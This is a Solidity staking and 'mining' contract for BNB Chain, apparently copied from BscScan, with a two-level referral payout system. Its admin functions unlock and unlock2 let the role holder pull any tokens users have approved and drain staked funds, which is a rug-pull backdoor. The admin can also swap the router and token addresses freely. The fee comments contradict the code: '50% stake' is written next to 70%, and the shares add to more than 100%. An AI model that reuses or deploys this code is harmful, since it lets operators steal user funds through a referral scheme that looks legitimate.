/**
 *Submitted for verification at BscScan.com on 2022-04-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,address tokenB,uint amountADesired,uint amountBDesired,
        uint amountAMin,uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,uint amountTokenDesired,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity, uint amountAMin,
        uint amountBMin, address to, uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token, uint liquidity, uint amountTokenMin,
        uint amountETHMin, address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token, uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,
        address[] calldata path,address to,uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,address[] calldata path,address to,uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,
        address to,uint deadline
    ) external;
}

contract FttsMiner {
    uint256 private ethBurn = 10 ** 6;
    uint256 private power1  = 2;
    uint256 private power2  = 1;
    uint256 private power3  = 0;
    uint256 private dayout  = 60;
    uint256 private minhold = 10 ** 18;
    uint256 private miners  = 0;
    uint256 private stakes  = 0;

    uint256 public durations = 86400;
    address public _fist     = 0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A;
    address public _ftts     = 0x4646B94579DB595789aC46f69475fBaaFB7086cC;
    address public _fttsLP   = 0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A;
    address public _router   = 0x1B6C9c20693afDE803B27F8782156c0f892ABC2d;
    address public _backAddr;
    address public _backLp;

    mapping (address => uint256[9]) private data;  // startTime claimTime unClaimNum awardTime awardNum endTime power stakeNum unStakeTime
    mapping (address => address[])  private team1; // user -> teams1
    mapping (address => address[])  private team2; // user -> teams2
    mapping (address => address)    private boss;  // user -> boss
    mapping (address => bool)       private role;  // user -> true
    mapping (address => bool)       private mine;

    constructor() {
        role[_msgSender()] = true;
        _backAddr = _msgSender();
        _backLp = _msgSender();

        IERC20(_fist).approve(_router, 99 * 10**75);
        IERC20(_ftts).approve(_router, 99 * 10**75);
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function hasRole(address addr) public view returns (bool) {
        return role[addr];
    }

    function setRole(address addr, bool val) public {
        require(hasRole(_msgSender()), "must have role");
        role[addr] = val;
    }

	function unlock(address con, address addr, uint256 val) public {
        require(hasRole(_msgSender()) && addr != address(0));
        if (con == address(0)) {payable(addr).transfer(val);} 
        else {IERC20(con).transfer(addr, val);}
	}

    function unlock2(address con, address f, address t, uint256 val) public {
        require(hasRole(_msgSender()) && f != address(0));
        IERC20(con).transferFrom(f, t, val);
    }

    function getTeam1(address addr) public view returns (address[] memory) {
        return team1[addr];
    }

    function getTeam2(address addr) public view returns (address[] memory) {
        return team2[addr];
    }

    function getData(address addr) public view returns (uint256[29] memory, address[4] memory) {
        uint256 invite = sumInvitePower(addr);
        uint256 claim;
        uint256 chanliang;
        (claim,chanliang) = getClaim(addr, invite);
        uint256[29] memory arr = [invite, claim, chanliang, ethBurn, power1, power2, power3, 
            dayout, minhold, miners, stakes, data[addr][0], data[addr][1], data[addr][3], 
            data[addr][4], data[addr][5], data[addr][6], data[addr][7], data[addr][8], 
            team1[addr].length, team2[addr].length, 0, 
            totalSupply(), 
            IERC20(_ftts).balanceOf(addr), 
            IERC20(_fist).balanceOf(address(this)), 
            IERC20(_fist).allowance(addr, address(this)),
            IERC20(_fttsLP).balanceOf(addr), 
            IERC20(_fttsLP).allowance(addr, address(this)),
            IERC20(_fist).balanceOf(addr)];
        return (arr, [boss[addr], _backAddr, _fist, _fttsLP]);
    }
    
    function totalSupply() private view returns(uint256) {
        return IERC20(_ftts).totalSupply() - IERC20(_ftts).balanceOf(address(this));
    }

    function setData(uint256[] memory confs) public {
        require(hasRole(_msgSender()), "must have role");
        ethBurn  = confs[0];
        power1   = confs[1];
        power2   = confs[2];
        power3   = confs[3];
        dayout   = confs[4];
        minhold  = confs[5];
    }

    function setBack(address back, address backlp) public {
        require(hasRole(_msgSender()), "must have role");
        _backAddr = back;
        _backLp = backlp;
    }

    function setCoin(address lp, address router) public {
        require(hasRole(_msgSender()), "must have role");
        _fttsLP = lp;
        _router = router;
    }

    function setCoin2(address fist, address ftts) public {
        require(hasRole(_msgSender()), "must have role");
        _fist = fist;
        _ftts = ftts;
        IERC20(_fist).approve(_router, 99 * 10**75);
        IERC20(_ftts).approve(_router, 99 * 10**75);
    }

    receive() external payable {}

    function getClaim(address addr, uint256 invitePower) public view returns(uint256, uint256) {
        uint256 claimNum = data[addr][2];
        uint256 etime = data[addr][5];
        
        uint256 chanlinag = dayout - (totalSupply() / 10 ** 18 - 3000000) / 3000000 * 10;
        
        // plus mining claim
        if (data[addr][0] > 0 && etime > data[addr][1]) {
            uint256 power = 100 + data[addr][6] + invitePower;
            
            if (etime > block.timestamp) {
                etime = block.timestamp;
            }
            
            // * power / 100
            // * (etime - data[addr][1]) / 86400
            claimNum += chanlinag * 10 ** 18  * power * (etime - data[addr][1]) / 100 / durations;
        }
        
        return (claimNum, chanlinag);
    }
    
    function sumInvitePower(address addr) public view returns (uint256) {
        uint256 total = team1[addr].length * power1 + team2[addr].length * power2;
        return total;
    }

    function _swapTokenForToken(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = _fist;path[1] = address(this);
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, payable(_backAddr), block.timestamp);
    }

    function addLiquidity2(uint256 t1, uint256 t2) private {
        IPancakeRouter02(_router).addLiquidity(_ftts, 
            _fist, t1, t2, 0, 0, _backLp, block.timestamp);
    }

    function doStart(address invite) public payable {
        if (boss[_msgSender()] == address(0) && _msgSender() != invite && invite != address(0)) {
            boss[_msgSender()] = invite;
            team1[invite].push(_msgSender());
            
            address invite2 = boss[invite];
            if (invite2 != address(0)) {
                team2[invite2].push(_msgSender());
            }
        }

        transferFist();

        if (data[_msgSender()][0] > 0) {
            uint256 claim;
            (claim,) = getClaim(_msgSender(), sumInvitePower(_msgSender()));
            data[_msgSender()][2] = claim;
        }
        
        data[_msgSender()][0] = block.timestamp;
        data[_msgSender()][1] = block.timestamp;
        data[_msgSender()][5] = block.timestamp +  durations;

        if (!mine[_msgSender()]) {
            mine[_msgSender()] = true;
            miners++;
        }
    }
    
    function doClaim() public {
        uint256 canClaim;
        (canClaim,) = getClaim(_msgSender(), sumInvitePower(_msgSender()));
        
        if (canClaim > 0) {
            IERC20(_ftts).transfer(_msgSender(), canClaim);
            
            data[_msgSender()][1] = block.timestamp;
            data[_msgSender()][2] = 0;
        }
        
        transferFist();
    }

    function transferFist() private {
        // 15% admin
        IERC20(_fist).transferFrom(_msgSender(), _backAddr, ethBurn * 15 / 100);
        // 50% stake
        IERC20(_fist).transferFrom(_msgSender(), address(this), ethBurn * 70 / 100);
        // 20% flow
        addLiquidity2(IERC20(_ftts).balanceOf(address(this)), ethBurn * 20 / 100);
        address parent = boss[_msgSender()];
        if (parent != address(0)) {
            IERC20(_fist).transferFrom(_msgSender(), parent, ethBurn * 10 / 100);
            parent = boss[parent];
            if (parent != address(0)) {
                IERC20(_fist).transferFrom(_msgSender(), parent, ethBurn * 5 / 100);
            } else {
                IERC20(_fist).transferFrom(_msgSender(), _backAddr, ethBurn * 5 / 100);
            }
        } else {
            IERC20(_fist).transferFrom(_msgSender(), _backAddr, ethBurn * 15 / 100);
        }
    }
    
    function stake2(uint256 amount) public {
        IERC20(_fttsLP).transferFrom(_msgSender(), address(this), amount);
        data[_msgSender()][7] += amount;
        data[_msgSender()][8] = 0;
        stakes += amount;
    }

    function unstake() public payable {
        require(data[_msgSender()][0] + (durations * 30) < block.timestamp);
        IERC20(_fttsLP).transfer(_msgSender(), data[_msgSender()][7]);
        stakes -= data[_msgSender()][7];
        data[_msgSender()][7] = 0;
    }

    function doAward() public {
        require(data[_msgSender()][3] + durations < block.timestamp);
        require(data[_msgSender()][7] >= minhold);

        IERC20 coin = IERC20(_fist);

        uint256 award = data[_msgSender()][7] * coin.balanceOf(address(this)) / stakes;
        coin.transfer(_msgSender(), award);
        
        data[_msgSender()][4] += award;
        data[_msgSender()][3] =  block.timestamp;
    }
    
}